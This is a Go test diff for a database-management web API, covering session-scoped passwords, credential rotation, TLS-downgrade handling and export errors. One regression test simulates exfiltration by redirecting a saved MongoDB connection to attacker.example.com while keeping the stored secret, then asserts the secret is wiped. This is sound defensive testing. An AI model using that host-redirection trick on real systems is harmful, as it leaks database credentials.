@@ -1,15 +1,20 @@
 package api_test
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"io"
 	"mime/multipart"
+	"net"
 	"net/http"
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
+	"sync/atomic"
 	"testing"
 	"time"
 	"unicode/utf8"
@@ -1016,5 +1021,601 @@ func TestV101WebSecuritySandboxesVsDesktopZeroAccountIsolation(t *testing.T) {
 	})
 	if deskAttachW.Code != http.StatusOK {
 		t.Fatalf("expected Desktop SQLite to allow local ATTACH DATABASE without Web sandbox interference, got %d: %s", deskAttachW.Code, deskAttachW.Body.String())
+	}
+}
+
+func startMockAuthRedisServer(t *testing.T, initialPass string) (host string, port int, setExpectedPassword func(string)) {
+	t.Helper()
+	var expectedPass atomic.Value
+	expectedPass.Store(initialPass)
+
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatalf("listen mock redis: %v", err)
+	}
+	t.Cleanup(func() { _ = ln.Close() })
+
+	go func() {
+		for {
+			conn, err := ln.Accept()
+			if err != nil {
+				return
+			}
+			go func(c net.Conn) {
+				defer c.Close()
+				r := bufio.NewReader(c)
+				authedPass := ""
+				for {
+					line, err := r.ReadString('\n')
+					if err != nil {
+						return
+					}
+					line = strings.TrimRight(line, "\r\n")
+					if !strings.HasPrefix(line, "*") {
+						continue
+					}
+					argc, err := strconv.Atoi(line[1:])
+					if err != nil || argc <= 0 {
+						continue
+					}
+					args := make([]string, 0, argc)
+					for i := 0; i < argc; i++ {
+						szLine, err := r.ReadString('\n')
+						if err != nil {
+							return
+						}
+						sz, err := strconv.Atoi(strings.TrimPrefix(strings.TrimRight(szLine, "\r\n"), "$"))
+						if err != nil || sz < 0 {
+							return
+						}
+						buf := make([]byte, sz+2)
+						if _, err := io.ReadFull(r, buf); err != nil {
+							return
+						}
+						args = append(args, string(buf[:sz]))
+					}
+
+					cmd := strings.ToUpper(args[0])
+					curExpected, _ := expectedPass.Load().(string)
+
+					switch cmd {
+					case "HELLO":
+						// Force RESP2 fallback so go-redis sends standard AUTH
+						_, _ = io.WriteString(c, "-ERR unknown command 'HELLO'\r\n")
+					case "AUTH":
+						given := ""
+						if len(args) >= 3 {
+							given = args[2]
+						} else if len(args) == 2 {
+							given = args[1]
+						}
+						if curExpected != "" && given != curExpected {
+							authedPass = ""
+							_, _ = io.WriteString(c, "-WRONGPASS invalid username-password pair or user is disabled.\r\n")
+						} else {
+							authedPass = given
+							_, _ = io.WriteString(c, "+OK\r\n")
+						}
+					case "QUIT":
+						_, _ = io.WriteString(c, "+OK\r\n")
+						return
+					default:
+						if curExpected != "" && authedPass != curExpected {
+							_, _ = io.WriteString(c, "-NOAUTH Authentication required.\r\n")
+							continue
+						}
+						switch cmd {
+						case "PING":
+							_, _ = io.WriteString(c, "+PONG\r\n")
+						case "CLIENT", "SELECT":
+							_, _ = io.WriteString(c, "+OK\r\n")
+						case "INFO":
+							payload := "# Server\r\nredis_version:7.2.4\r\n# Keyspace\r\ndb0:keys=2,expires=0\r\n"
+							_, _ = fmt.Fprintf(c, "$%d\r\n%s\r\n", len(payload), payload)
+						case "SCAN":
+							_, _ = io.WriteString(c, "*2\r\n$1\r\n0\r\n*2\r\n$7\r\nuser:01\r\n$7\r\nuser:02\r\n")
+						default:
+							_, _ = io.WriteString(c, "+OK\r\n")
+						}
+					}
+				}
+			}(conn)
+		}
+	}()
+
+	addr := ln.Addr().(*net.TCPAddr)
+	return "127.0.0.1", addr.Port, func(next string) {
+		expectedPass.Store(next)
+	}
+}
+
+func TestConnectionPasswordPolicySessionIsolationAndAuthFailureRePrompt(t *testing.T) {
+	redisHost, redisPort, setRedisPass := startMockAuthRedisServer(t, "InitPass#1")
+
+	webDir := t.TempDir()
+	vault, err := crypto.NewVaultFromDataDir(webDir, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	st, err := store.Open(webDir, vault, "admin", "AdminPass123!")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer st.Close()
+
+	pm := pool.NewManager(st, 8)
+	defer pm.CloseAll()
+	tm := auth.NewTokenManager(vault.DeriveBytes("phase8-web"))
+	router := api.NewRouterWithOptions(st, pm, tm, api.RouterOptions{
+		ProtectorSecret: vault.DeriveBytes("phase8-protector"),
+	})
+
+	doReq := func(method, path, token string, body any) *httptest.ResponseRecorder {
+		var buf bytes.Buffer
+		if body != nil {
+			_ = json.NewEncoder(&buf).Encode(body)
+		}
+		req := httptest.NewRequest(method, path, &buf)
+		req.RemoteAddr = "127.0.0.1:23456"
+		if body != nil {
+			req.Header.Set("Content-Type", "application/json")
+		}
+		if token != "" {
+			req.Header.Set("Authorization", "Bearer "+token)
+		}
+		w := httptest.NewRecorder()
+		router.ServeHTTP(w, req)
+		return w
+	}
+
+	loginNewSession := func() string {
+		w := doReq(http.MethodPost, "/api/auth/login", "", map[string]string{
+			"username": "admin",
+			"password": "AdminPass123!",
+		})
+		if w.Code != http.StatusOK {
+			t.Fatalf("login failed (%d): %s", w.Code, w.Body.String())
+		}
+		var res struct {
+			Token string `json:"token"`
+		}
+		_ = json.Unmarshal(w.Body.Bytes(), &res)
+		return res.Token
+	}
+
+	// 1. Session A creates a Redis connection WITHOUT specifying rememberPassword -> must default to rememberPassword=false,
+	//    store zero password on disk, yet remain unlocked=true in Session A!
+	tokA := loginNewSession()
+	createW := doReq(http.MethodPost, "/api/connections", tokA, map[string]any{
+		"name":     "Session Redis",
+		"type":     "redis",
+		"host":     redisHost,
+		"port":     redisPort,
+		"password": "InitPass#1",
+	})
+	if createW.Code != http.StatusOK {
+		t.Fatalf("POST /api/connections failed (%d): %s", createW.Code, createW.Body.String())
+	}
+	var created store.SavedConnection
+	_ = json.Unmarshal(createW.Body.Bytes(), &created)
+	if created.RememberPassword {
+		t.Fatalf("expected new Redis connection to default to rememberPassword=false, got true")
+	}
+	if !created.Unlocked {
+		t.Fatalf("expected creator session A to see unlocked=true immediately after creation")
+	}
+
+	// Disk check: decrypted password on disk must be empty
+	diskCfg, err := st.GetDecryptedConnection(created.ID)
+	if err != nil {
+		t.Fatalf("GetDecryptedConnection: %v", err)
+	}
+	if diskCfg.Password != "" {
+		t.Fatalf("expected zero password persisted on disk when rememberPassword=false, got %q", diskCfg.Password)
+	}
+
+	// Session A can immediately query databases via its in-memory session credential
+	dbsAW := doReq(http.MethodGet, "/api/conn/"+created.ID+"/databases", tokA, nil)
+	if dbsAW.Code != http.StatusOK {
+		t.Fatalf("expected Session A listDatabases to succeed using session credential, got %d: %s", dbsAW.Code, dbsAW.Body.String())
+	}
+
+	// 2. Session B logs in separately -> sees unlocked=false and receives 400 + code="DB_AUTH_REQUIRED"
+	tokB := loginNewSession()
+	listBW := doReq(http.MethodGet, "/api/connections", tokB, nil)
+	var listBRes struct {
+		Connections []store.SavedConnection `json:"connections"`
+	}
+	_ = json.Unmarshal(listBW.Body.Bytes(), &listBRes)
+	var foundRedisInB *store.SavedConnection
+	for i := range listBRes.Connections {
+		if listBRes.Connections[i].ID == created.ID {
+			foundRedisInB = &listBRes.Connections[i]
+			break
+		}
+	}
+	if foundRedisInB == nil || foundRedisInB.RememberPassword || foundRedisInB.Unlocked {
+		t.Fatalf("expected Session B to see rememberPassword=false & unlocked=false for Session Redis, got %+v", listBRes.Connections)
+	}
+
+	dbsBW := doReq(http.MethodGet, "/api/conn/"+created.ID+"/databases", tokB, nil)
+	if dbsBW.Code != http.StatusBadRequest || !strings.Contains(dbsBW.Body.String(), `"code":"DB_AUTH_REQUIRED"`) {
+		t.Fatalf("expected 400 DB_AUTH_REQUIRED in Session B, got %d: %s", dbsBW.Code, dbsBW.Body.String())
+	}
+
+	// Unlocking Session B with wrong password returns 400 + code="DB_AUTH_FAILED"
+	badUnlockW := doReq(http.MethodPost, "/api/connections/"+created.ID+"/unlock", tokB, map[string]any{
+		"password":         "WrongPass#0",
+		"rememberPassword": false,
+	})
+	if badUnlockW.Code != http.StatusBadRequest || !strings.Contains(badUnlockW.Body.String(), `"code":"DB_AUTH_FAILED"`) {
+		t.Fatalf("expected 400 DB_AUTH_FAILED on wrong unlock password, got %d: %s", badUnlockW.Code, badUnlockW.Body.String())
+	}
+
+	// Unlocking Session B with valid password succeeds for Session B only (disk remains empty)
+	okUnlockW := doReq(http.MethodPost, "/api/connections/"+created.ID+"/unlock", tokB, map[string]any{
+		"password":         "InitPass#1",
+		"rememberPassword": false,
+	})
+	if okUnlockW.Code != http.StatusOK {
+		t.Fatalf("expected Session B unlock to succeed, got %d: %s", okUnlockW.Code, okUnlockW.Body.String())
+	}
+	if dbsB2W := doReq(http.MethodGet, "/api/conn/"+created.ID+"/databases", tokB, nil); dbsB2W.Code != http.StatusOK {
+		t.Fatalf("expected Session B listDatabases after unlock to succeed, got %d: %s", dbsB2W.Code, dbsB2W.Body.String())
+	}
+
+	// Logging out Session B evicts its session credentials
+	if logoutBW := doReq(http.MethodPost, "/api/auth/logout", tokB, nil); logoutBW.Code != http.StatusOK {
+		t.Fatalf("Session B logout failed: %d", logoutBW.Code)
+	}
+
+	// 3. Session A edits connection to turn ON rememberPassword=true (leaving password blank promotes Session A's vault secret!)
+	promoteW := doReq(http.MethodPut, "/api/connections/"+created.ID, tokA, map[string]any{
+		"name":               "Session Redis",
+		"type":               "redis",
+		"host":               redisHost,
+		"port":               redisPort,
+		"password":           "",
+		"keepExistingSecret": true,
+		"rememberPassword":   true,
+	})
+	if promoteW.Code != http.StatusOK {
+		t.Fatalf("PUT promote rememberPassword=true failed (%d): %s", promoteW.Code, promoteW.Body.String())
+	}
+	diskCfgPromoted, _ := st.GetDecryptedConnection(created.ID)
+	if diskCfgPromoted.Password != "InitPass#1" || !diskCfgPromoted.ShouldRememberPassword() {
+		t.Fatalf("expected session secret to be promoted to disk on rememberPassword=true, got %+v", diskCfgPromoted)
+	}
+
+	// 4. Fresh Session C auto-connects without prompting, then Redis password rotates -> must return DB_AUTH_FAILED!
+	tokC := loginNewSession()
+	if dbsCW := doReq(http.MethodGet, "/api/conn/"+created.ID+"/databases", tokC, nil); dbsCW.Code != http.StatusOK {
+		t.Fatalf("expected Session C auto-connect with remembered password to succeed, got %d: %s", dbsCW.Code, dbsCW.Body.String())
+	}
+
+	setRedisPass("RotatedPass#2")
+	rotatedErrW := doReq(http.MethodGet, "/api/conn/"+created.ID+"/databases", tokC, nil)
+	if rotatedErrW.Code != http.StatusBadRequest || !strings.Contains(rotatedErrW.Body.String(), `"code":"DB_AUTH_FAILED"`) {
+		t.Fatalf("expected 400 DB_AUTH_FAILED after server password rotation on remembered connection, got %d: %s", rotatedErrW.Code, rotatedErrW.Body.String())
+	}
+
+	// Session C re-authenticates via /unlock with new password + rememberPassword=true -> updates disk & reconnects!
+	reauthW := doReq(http.MethodPost, "/api/connections/"+created.ID+"/unlock", tokC, map[string]any{
+		"password":         "RotatedPass#2",
+		"rememberPassword": true,
+	})
+	if reauthW.Code != http.StatusOK {
+		t.Fatalf("expected re-auth unlock with RotatedPass#2 to succeed, got %d: %s", reauthW.Code, reauthW.Body.String())
+	}
+	if dbsC2W := doReq(http.MethodGet, "/api/conn/"+created.ID+"/databases", tokC, nil); dbsC2W.Code != http.StatusOK {
+		t.Fatalf("expected listDatabases after re-auth unlock to succeed, got %d: %s", dbsC2W.Code, dbsC2W.Body.String())
+	}
+
+	// 5. Turn OFF rememberPassword via Edit Connection (without re-typing password) -> wipes disk password immediately,
+	//    keeps Session C unlocked in memory, and prompts fresh Session D with DB_AUTH_REQUIRED!
+	turnOffW := doReq(http.MethodPut, "/api/connections/"+created.ID, tokC, map[string]any{
+		"name":               "Session Redis",
+		"type":               "redis",
+		"host":               redisHost,
+		"port":               redisPort,
+		"password":           "",
+		"keepExistingSecret": true,
+		"rememberPassword":   false,
+	})
+	if turnOffW.Code != http.StatusOK {
+		t.Fatalf("PUT turn off rememberPassword failed (%d): %s", turnOffW.Code, turnOffW.Body.String())
+	}
+	var turnedOffConn store.SavedConnection
+	_ = json.Unmarshal(turnOffW.Body.Bytes(), &turnedOffConn)
+	if turnedOffConn.RememberPassword || !turnedOffConn.Unlocked {
+		t.Fatalf("expected rememberPassword=false & unlocked=true in editor Session C, got %+v", turnedOffConn)
+	}
+	diskCfgWiped, _ := st.GetDecryptedConnection(created.ID)
+	if diskCfgWiped.Password != "" || diskCfgWiped.ShouldRememberPassword() {
+		t.Fatalf("expected disk password to be wiped after turning off rememberPassword, got %+v", diskCfgWiped)
+	}
+	if dbsC3W := doReq(http.MethodGet, "/api/conn/"+created.ID+"/databases", tokC, nil); dbsC3W.Code != http.StatusOK {
+		t.Fatalf("expected editor Session C to remain connected during current session, got %d: %s", dbsC3W.Code, dbsC3W.Body.String())
+	}
+
+	tokD := loginNewSession()
+	dbsDW := doReq(http.MethodGet, "/api/conn/"+created.ID+"/databases", tokD, nil)
+	if dbsDW.Code != http.StatusBadRequest || !strings.Contains(dbsDW.Body.String(), `"code":"DB_AUTH_REQUIRED"`) {
+		t.Fatalf("expected fresh Session D to receive DB_AUTH_REQUIRED after rememberPassword was turned off, got %d: %s", dbsDW.Code, dbsDW.Body.String())
+	}
+}
+
+func TestSecurityRegressionsH1H2M7AndDelayedExportHeaders(t *testing.T) {
+	redisHost, redisPort, _ := startMockAuthRedisServer(t, "SharedInternal#1")
+
+	// Start a mock ClickHouse HTTP endpoint that rejects queries with 401 / Code 516 auth failure
+	chAuthFailSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusUnauthorized)
+		_, _ = io.WriteString(w, "Code: 516. DB::Exception: default: Authentication failed: password is incorrect.")
+	}))
+	defer chAuthFailSrv.Close()
+	chTCPAddr := chAuthFailSrv.Listener.Addr().(*net.TCPAddr)
+
+	webDir := t.TempDir()
+	vault, err := crypto.NewVaultFromDataDir(webDir, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	st, err := store.Open(webDir, vault, "admin", "AdminPass123!")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer st.Close()
+
+	pm := pool.NewManager(st, 8)
+	defer pm.CloseAll()
+	tm := auth.NewTokenManager(vault.DeriveBytes("sec-reg-jwt"))
+	router := api.NewRouterWithOptions(st, pm, tm, api.RouterOptions{
+		ProtectorSecret:            vault.DeriveBytes("sec-reg-protector"),
+		AllowPrivateNetForNonAdmin: false,
+	})
+	defer router.ClearAllSessionCreds()
+
+	doReq := func(method, path, token string, body any) *httptest.ResponseRecorder {
+		var buf bytes.Buffer
+		if body != nil {
+			_ = json.NewEncoder(&buf).Encode(body)
+		}
+		req := httptest.NewRequest(method, path, &buf)
+		req.RemoteAddr = "127.0.0.1:24567"
+		if body != nil {
+			req.Header.Set("Content-Type", "application/json")
+		}
+		if token != "" {
+			req.Header.Set("Authorization", "Bearer "+token)
+		}
+		w := httptest.NewRecorder()
+		router.ServeHTTP(w, req)
+		return w
+	}
+
+	loginAs := func(username, password string) string {
+		w := doReq(http.MethodPost, "/api/auth/login", "", map[string]string{
+			"username": username,
+			"password": password,
+		})
+		if w.Code != http.StatusOK {
+			t.Fatalf("login(%s) failed (%d): %s", username, w.Code, w.Body.String())
+		}
+		var res struct {
+			Token string `json:"token"`
+		}
+		_ = json.Unmarshal(w.Body.Bytes(), &res)
+		return res.Token
+	}
+
+	adminTok := loginAs("admin", "AdminPass123!")
+
+	// 1. [H1] PUT /api/connections/{id} must reject KeepExistingSecret=true when URI host changes or TLS is downgraded
+	createMongoW := doReq(http.MethodPost, "/api/connections", adminTok, map[string]any{
+		"name":             "Prod Mongo TLS",
+		"type":             "mongodb",
+		"uri":              "mongodb://alice:UltraSecret99@db1.example.com:27017/prod?tls=true",
+		"rememberPassword": true,
+	})
+	if createMongoW.Code != http.StatusOK {
+		t.Fatalf("create Prod Mongo TLS failed (%d): %s", createMongoW.Code, createMongoW.Body.String())
+	}
+	var mongoTLSConn store.SavedConnection
+	_ = json.Unmarshal(createMongoW.Body.Bytes(), &mongoTLSConn)
+
+	// [H1a] Attempt exfiltration by changing URI host with KeepExistingSecret=true and blank password
+	exfilHostW := doReq(http.MethodPut, "/api/connections/"+mongoTLSConn.ID, adminTok, map[string]any{
+		"name":               "Prod Mongo TLS",
+		"type":               "mongodb",
+		"uri":                "mongodb://alice@attacker.example.com:27017/prod?tls=true",
+		"password":           "",
+		"keepExistingSecret": true,
+		"rememberPassword":   true,
+	})
+	if exfilHostW.Code != http.StatusOK {
+		t.Fatalf("PUT host change failed (%d): %s", exfilHostW.Code, exfilHostW.Body.String())
+	}
+	decAfterHostChange, err := st.GetDecryptedConnection(mongoTLSConn.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if decAfterHostChange.Password != "" || strings.Contains(decAfterHostChange.URI, "UltraSecret99") {
+		t.Fatalf("[H1] secret leaked into changed URI host: pass=%q uri=%q", decAfterHostChange.Password, decAfterHostChange.URI)
+	}
+
+	// [H1b] Attempt TLS downgrade (sslmode=require -> sslmode=disable, and URI ?tls=true -> plaintext) with KeepExistingSecret=true
+	createPGTLSW := doReq(http.MethodPost, "/api/connections", adminTok, map[string]any{
+		"name":             "Prod PG TLS",
+		"type":             "postgres",
+		"host":             "pg.example.com",
+		"port":             5432,
+		"username":         "pgadmin",
+		"password":         "PGTopSecret#1",
+		"options":          map[string]string{"sslmode": "require"},
+		"rememberPassword": true,
+	})
+	if createPGTLSW.Code != http.StatusOK {
+		t.Fatalf("create Prod PG TLS failed (%d): %s", createPGTLSW.Code, createPGTLSW.Body.String())
+	}
+	var pgTLSConn store.SavedConnection
+	_ = json.Unmarshal(createPGTLSW.Body.Bytes(), &pgTLSConn)
+
+	downgradePGW := doReq(http.MethodPut, "/api/connections/"+pgTLSConn.ID, adminTok, map[string]any{
+		"name":               "Prod PG TLS",
+		"type":               "postgres",
+		"host":               "pg.example.com",
+		"port":               5432,
+		"username":           "pgadmin",
+		"password":           "",
+		"options":            map[string]string{"sslmode": "disable"},
+		"keepExistingSecret": true,
+		"rememberPassword":   true,
+	})
+	if downgradePGW.Code != http.StatusOK {
+		t.Fatalf("PUT PG TLS downgrade failed (%d): %s", downgradePGW.Code, downgradePGW.Body.String())
+	}
+	decDowngradedPG, err := st.GetDecryptedConnection(pgTLSConn.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if decDowngradedPG.Password != "" {
+		t.Fatalf("[H1] expected TLS downgrade to clear stored password when KeepExistingSecret=true, got %q", decDowngradedPG.Password)
+	}
+
+	// 2. [H2] Non-admin (readonly & readwrite) users unlocking an admin-owned shared loopback/internal connection
+	sharedRedisW := doReq(http.MethodPost, "/api/connections", adminTok, map[string]any{
+		"name":             "Admin Shared Loopback Redis",
+		"type":             "redis",
+		"host":             redisHost,
+		"port":             redisPort,
+		"visibility":       "shared",
+		"rememberPassword": false,
+	})
+	if sharedRedisW.Code != http.StatusOK {
+		t.Fatalf("create shared loopback Redis failed (%d): %s", sharedRedisW.Code, sharedRedisW.Body.String())
+	}
+	var sharedRedis store.SavedConnection
+	_ = json.Unmarshal(sharedRedisW.Body.Bytes(), &sharedRedis)
+
+	for _, u := range []struct {
+		username string
+		role     string
+	}{
+		{"ro_operator", store.RoleReadOnly},
+		{"rw_operator", store.RoleReadWrite},
+	} {
+		cw := doReq(http.MethodPost, "/api/admin/users", adminTok, map[string]any{
+			"username":      u.username,
+			"password":      "UserPass123!",
+			"role":          u.role,
+			"connScope":     "all",
+			"canCreateConn": false,
+		})
+		if cw.Code != http.StatusOK {
+			t.Fatalf("create user %s failed (%d): %s", u.username, cw.Code, cw.Body.String())
+		}
+		uTok := loginAs(u.username, "UserPass123!")
+		unlockW := doReq(http.MethodPost, "/api/connections/"+sharedRedis.ID+"/unlock", uTok, map[string]any{
+			"password":         "SharedInternal#1",
+			"rememberPassword": false,
+		})
+		if unlockW.Code != http.StatusOK {
+			t.Fatalf("[H2] expected %s (%s) to unlock admin-shared loopback connection, got %d: %s", u.username, u.role, unlockW.Code, unlockW.Body.String())
+		}
+		dbsW := doReq(http.MethodGet, "/api/conn/"+sharedRedis.ID+"/databases", uTok, nil)
+		if dbsW.Code != http.StatusOK {
+			t.Fatalf("[H2] expected %s listDatabases after unlock to succeed, got %d: %s", u.username, dbsW.Code, dbsW.Body.String())
+		}
+	}
+
+	// 3. [M7] MongoDB URI connection with RememberPassword=false: metadata edit (KeepExistingSecret=true, stripped URI)
+	//    must preserve the unlocked session password instead of wiping it!
+	createSessMongoW := doReq(http.MethodPost, "/api/connections", adminTok, map[string]any{
+		"name":             "Session Mongo URI",
+		"type":             "mongodb",
+		"uri":              "mongodb://mongo_user:SessMongoPass#77@mongo.example.com:27017/appdb?authSource=admin",
+		"rememberPassword": false,
+	})
+	if createSessMongoW.Code != http.StatusOK {
+		t.Fatalf("create Session Mongo URI failed (%d): %s", createSessMongoW.Code, createSessMongoW.Body.String())
+	}
+	var sessMongo store.SavedConnection
+	_ = json.Unmarshal(createSessMongoW.Body.Bytes(), &sessMongo)
+	if !sessMongo.Unlocked || sessMongo.RememberPassword {
+		t.Fatalf("expected Session Mongo URI to start unlocked=true & rememberPassword=false, got %+v", sessMongo)
+	}
+
+	metaEditW := doReq(http.MethodPut, "/api/connections/"+sessMongo.ID, adminTok, map[string]any{
+		"name":               "Session Mongo URI Renamed",
+		"type":               "mongodb",
+		"color":              "#10b981",
+		"username":           "mongo_user",
+		"password":           "",
+		"uri":                "mongodb://mongo_user@mongo.example.com:27017/appdb?authSource=admin",
+		"keepExistingSecret": true,
+		"rememberPassword":   false,
+	})
+	if metaEditW.Code != http.StatusOK {
+		t.Fatalf("metadata edit Session Mongo URI failed (%d): %s", metaEditW.Code, metaEditW.Body.String())
+	}
+	var editedSessMongo store.SavedConnection
+	_ = json.Unmarshal(metaEditW.Body.Bytes(), &editedSessMongo)
+	if !editedSessMongo.Unlocked {
+		t.Fatalf("[M7] expected Session Mongo URI to stay unlocked=true after metadata edit with stripped URI")
+	}
+
+	// Promote to RememberPassword=true without retyping password (still passing stripped URI) to verify the exact secret survived
+	promoteMongoW := doReq(http.MethodPut, "/api/connections/"+sessMongo.ID, adminTok, map[string]any{
+		"name":               "Session Mongo URI Renamed",
+		"type":               "mongodb",
+		"username":           "mongo_user",
+		"password":           "",
+		"uri":                "mongodb://mongo_user@mongo.example.com:27017/appdb?authSource=admin",
+		"keepExistingSecret": true,
+		"rememberPassword":   true,
+	})
+	if promoteMongoW.Code != http.StatusOK {
+		t.Fatalf("promote Session Mongo URI failed (%d): %s", promoteMongoW.Code, promoteMongoW.Body.String())
+	}
+	decPromotedMongo, err := st.GetDecryptedConnection(sessMongo.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if decPromotedMongo.Password != "SessMongoPass#77" || store.ExtractPasswordFromURI(decPromotedMongo.URI) != "SessMongoPass#77" {
+		t.Fatalf("[M7] expected session password to survive metadata edit and promote intact, got pass=%q uri=%q", decPromotedMongo.Password, decPromotedMongo.URI)
+	}
+
+	// 4. Streaming export delayed headers: when StreamExport fails with an auth error before writing bytes,
+	//    handleExport must return 400 JSON with DB_AUTH_FAILED and NO Content-Disposition attachment header!
+	createCHW := doReq(http.MethodPost, "/api/connections", adminTok, map[string]any{
+		"name":             "AuthFail ClickHouse HTTP",
+		"type":             "clickhouse",
+		"host":             "127.0.0.1",
+		"port":             chTCPAddr.Port,
+		"username":         "default",
+		"password":         "BadPass",
+		"database":         "default",
+		"options":          map[string]string{"protocol": "http"},
+		"rememberPassword": true,
+	})
+	if createCHW.Code != http.StatusOK {
+		t.Fatalf("create ClickHouse HTTP connection failed (%d): %s", createCHW.Code, createCHW.Body.String())
+	}
+	var chConn store.SavedConnection
+	_ = json.Unmarshal(createCHW.Body.Bytes(), &chConn)
+
+	exportW := doReq(http.MethodGet, "/api/conn/"+chConn.ID+"/export?database=default&table=events&format=csv", adminTok, nil)
+	if exportW.Code != http.StatusBadRequest {
+		t.Fatalf("expected 400 Bad Request on StreamExport auth error before bytes written, got %d: %s", exportW.Code, exportW.Body.String())
+	}
+	if disp := exportW.Header().Get("Content-Disposition"); disp != "" {
+		t.Fatalf("expected no Content-Disposition header when export fails before first write, got %q", disp)
+	}
+	if !strings.Contains(exportW.Header().Get("Content-Type"), "application/json") {
+		t.Fatalf("expected application/json error response, got Content-Type=%q", exportW.Header().Get("Content-Type"))
+	}
+	if !strings.Contains(exportW.Body.String(), `"code":"DB_AUTH_FAILED"`) {
+		t.Fatalf("expected DB_AUTH_FAILED JSON body from handleExport, got %s", exportW.Body.String())
 	}
 }
